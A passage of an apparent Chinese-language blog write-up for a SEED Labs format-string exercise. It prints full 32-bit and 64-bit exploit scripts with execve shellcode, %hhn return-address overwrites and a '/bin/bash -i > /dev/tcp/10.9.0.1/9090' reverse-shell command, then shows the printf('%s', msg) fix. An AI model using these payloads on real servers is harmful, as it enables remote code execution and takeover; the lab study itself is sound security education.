+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/06/seedlab3/image-20251106143042737.png" alt="image-20251106143042737"></p>
+<h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p> 当 printf() 在 myprintf() 内部被调用时的栈布局。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106143801282.png" alt="image-20251106143801282"></p>
+<p>2中的地址是myprintf的ebp + 4</p>
+<blockquote>
+<p>ebp：Frame Pointer (inside myprintf):  </p>
+</blockquote>
+<p>3中的地址是buffer的起点</p>
+<blockquote>
+<p> The input buffer’s address:  </p>
+</blockquote>
+<p>根据前面的实验，<code>%68$x</code>可以定位到3的位置。</p>
+<p>要执行shellcode的步骤：</p>
+<ol>
+<li>shellcode的地址（代码中的地址为buffer + 1000）</li>
+<li>将返回地址修改为shellcode的地址</li>
+</ol>
+<p>在前面实验的基础上去构建。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+<span class="token keyword">import</span> sys
+
+N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+shellcode_32 <span class="token operator">=</span> <span class="token punctuation">(</span>
+   <span class="token string">"\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"</span>
+   <span class="token string">"\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"</span>
+   <span class="token string">"\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"</span>
+   <span class="token string">"/bin/bash*"</span>
+   <span class="token string">"-c*"</span>
+   <span class="token comment"># The * in this line serves as the position marker         *</span>
+   <span class="token comment">#"/bin/ls -l; echo '===== Success! ======'                  *"</span>
+   <span class="token string">"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2>&amp;1           *"</span>
+   <span class="token string">"AAAA"</span>   <span class="token comment"># Placeholder for argv[0] --> "/bin/bash"</span>
+   <span class="token string">"BBBB"</span>   <span class="token comment"># Placeholder for argv[1] --> "-c"</span>
+   <span class="token string">"CCCC"</span>   <span class="token comment"># Placeholder for argv[2] --> the command string</span>
+   <span class="token string">"DDDD"</span>   <span class="token comment"># Placeholder for argv[3] --> NULL</span>
+<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+
+content<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token number">1000</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode_32<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> shellcode_32
+<span class="token comment"># shellcode的地址 buffer + 1000 =0xffffdb78</span>
+shellcode_addr <span class="token operator">=</span>  <span class="token number">0xffffd790</span> <span class="token operator">+</span> <span class="token number">1000</span>
+<span class="token comment"># ret地址 ebp + 4</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0xffffd6a8</span> <span class="token operator">+</span> <span class="token number">4</span> 
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ret_addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+<span class="token comment"># 按从低到高的顺序写入shellcode_addr的每个字节</span>
+s <span class="token operator">=</span> <span class="token string">''</span>
+current_count <span class="token operator">=</span> <span class="token number">16</span>  <span class="token comment"># 前16字节是4个地址</span>
+<span class="token comment"># 写入 0x78 (120) 到 addr</span>
+pad <span class="token operator">=</span> <span class="token number">120</span> <span class="token operator">-</span> current_count
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%68$hhn'</span></span>
+current_count <span class="token operator">+=</span> pad
+<span class="token comment"># 写入 0xdb (219) 到 addr+1</span>
+pad <span class="token operator">=</span> <span class="token number">219</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">256</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%69$hhn'</span></span>
+current_count <span class="token operator">+=</span> pad
+<span class="token comment"># 写入 0xff (255) 到 addr+2</span>
+pad <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">512</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%70$hhn'</span></span>
+current_count <span class="token operator">+=</span> pad
+<span class="token comment"># 写入 0xff (255) 到 addr+3</span>
+pad <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">768</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%71$hhn'</span></span>
+
+fmt <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'badfile'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>已经获取到了反向shell</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106152358585.png" alt="image-20251106152358585"></p>
+<h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> hello <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.9</span>.0.6 <span class="token number">9090</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2025/11/06/seedlab3/image-20251106152832249.png" alt="image-20251106152832249"></p>
+<p>当printf遇见0时，会截断，所以我们不能把地址放在前面。</p>
+<p>我们只需要将地址在放后面就可以，因为printf在读格式化字符串时，没有复制。不同与strcpy。</p>
+<p>我们把shellcode放在1200开始的位置，把地址放在1000的位置，首先要找出地址的位置</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">ret_addr <span class="token operator">=</span> <span class="token number">0xaaaaaaAAaaaaaaAA</span>
+content<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token number">1000</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token string">'%p.'</span><span class="token operator">*</span><span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/06/seedlab3/image-20251106154336135.png" alt="image-20251106154336135"></p>
+<p>算出来是在<code>%161$p</code>的位置。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106154630808.png" alt="image-20251106154630808"></p>
+<p>所以和之前一样的步骤，这里只需要修改后48位的地址，因为前面的地址都是0。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+<span class="token keyword">import</span> sys
+
+N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+shellcode_64 <span class="token operator">=</span> <span class="token punctuation">(</span>
+   <span class="token string">"\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"</span>
+   <span class="token string">"\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"</span>
+   <span class="token string">"\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"</span>
+   <span class="token string">"\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"</span>
+   <span class="token string">"/bin/bash*"</span>
+   <span class="token string">"-c*"</span>
+   <span class="token comment"># The * in this line serves as the position marker         *</span>
+   <span class="token comment">#"/bin/ls -l; echo '===== Success! ======'                  *"</span>
+   <span class="token string">"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2>&amp;1           *"</span>
+   <span class="token string">"AAAAAAAA"</span>   <span class="token comment"># Placeholder for argv[0] --> "/bin/bash"</span>
+   <span class="token string">"BBBBBBBB"</span>   <span class="token comment"># Placeholder for argv[1] --> "-c"</span>
+   <span class="token string">"CCCCCCCC"</span>   <span class="token comment"># Placeholder for argv[2] --> the command string</span>
+   <span class="token string">"DDDDDDDD"</span>   <span class="token comment"># Placeholder for argv[3] --> NULL</span>
+<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+
+content<span class="token punctuation">[</span><span class="token number">1200</span><span class="token punctuation">:</span><span class="token number">1200</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode_64<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> shellcode_64
+<span class="token comment"># shellcode的地址 buffer + 1200 =0x00007fffffffeb60</span>
+shellcode_addr <span class="token operator">=</span>  <span class="token number">0x00007fffffffe6b0</span> <span class="token operator">+</span> <span class="token number">1200</span>
+<span class="token comment"># ret地址 ebp + 8</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0x00007fffffffe5e0</span> <span class="token operator">+</span> <span class="token number">8</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  content<span class="token punctuation">[</span><span class="token number">1000</span> <span class="token operator">+</span> i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">1000</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ret_addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+<span class="token comment"># 按从低到高的顺序写入shellcode_addr的每个字节</span>
+s <span class="token operator">=</span> <span class="token string">''</span>
+current_count <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token comment"># 写入 0x60 (96) 到 ret_addr</span>
+pad <span class="token operator">=</span> <span class="token number">96</span> <span class="token operator">-</span> current_count
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%161$hhn'</span></span>
+current_count <span class="token operator">+=</span> pad
+<span class="token comment"># 写入 0xeb (235) 到 ret_addr+1</span>
+pad <span class="token operator">=</span> <span class="token number">235</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">256</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%162$hhn'</span></span>
+current_count <span class="token operator">+=</span> pad
+<span class="token comment"># 写入 0xff (255) 到 addr+2</span>
+pad <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">512</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%163$hhn'</span></span>
+current_count <span class="token operator">+=</span> pad
+<span class="token comment"># 写入 0xff (255) 到 ret_addr+3</span>
+pad <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">768</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%164$hhn'</span></span>
+<span class="token comment"># 写入 0xff (255) 到 ret_addr+4</span>
+pad <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">1024</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%165$hhn'</span></span>
+<span class="token comment"># 写入 0x7f (127) 到 ret_addr+5</span>
+pad <span class="token operator">=</span> <span class="token number">127</span> <span class="token operator">-</span> current_count <span class="token operator">+</span> <span class="token number">1280</span>
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%166$hhn'</span></span>
+
+fmt <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'badfile'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/06/seedlab3/image-20251106155325013.png" alt="image-20251106155325013"></p>
+<h2 id="Task-6-Fixing-the-Problem"><a href="#Task-6-Fixing-the-Problem" class="headerlink" title="Task 6: Fixing the Problem"></a>Task 6: Fixing the Problem</h2><p> 修改 <code>format.c</code> ，将 <code>msg</code> 作为 <code>%s</code> 的参数打印：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>再次编译发现不会发出警告。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106155758095.png" alt="image-20251106155758095"></p>
+<p>再次攻击发现不会凑效。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次实验主要学习了格式字符串。该漏洞的利用方式有：程序崩溃，读取内容，修改内容。熟练掌握每一种利用方式。</p>
+
+  </div>
+  <div id=""></div>
+</div>
+
+<script>
+  
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
+});
+</script>
+
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
+</style>
+
+    <div class="post-paging">
+    
+
+    
+    <a href="/2025/11/05/moectf-2025-pwn/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p>moectf-2025-pwn</p>
+        </div>
+    </a>
+    
+</div>
+</div>
+		
+<div class="footer">
+	<div class="Copyright">
+		©2025 By Ram. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/79e/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/RamBree">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            transition: border .5s;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 20px;
+            height: 20px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $( '#js-go_top' )
+	.gotoTop( {
+		offset: 500,
+		speed: 300,
+		animationShow: {
+			'transform': 'translate(0,0)',
+			'transition': 'transform .5s ease-in-out'
+		},
+		animationHide: {
+			'transform': 'translate(100px,0)',
+			'transition': 'transform .5s ease-in-out'
+		}
+	} );
+</script>
+
+
+<!-- Baidu Analytics -->
+<script defer>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?f87362af66251bc3b7603e9ecfa19123";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+    <!-- Gitalk -->
+    <script>
+        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
+        const gitalk = new Gitalk({
+            ...JSON.parse( data),
+            id:location.pathname,
+            distractionFreeMode:false
+        })
+        
+        if(Boolean('false')){
+            gitalk.render('gitalk-container')
+        }
+    </script>
+
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/79e/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
+</html>
+
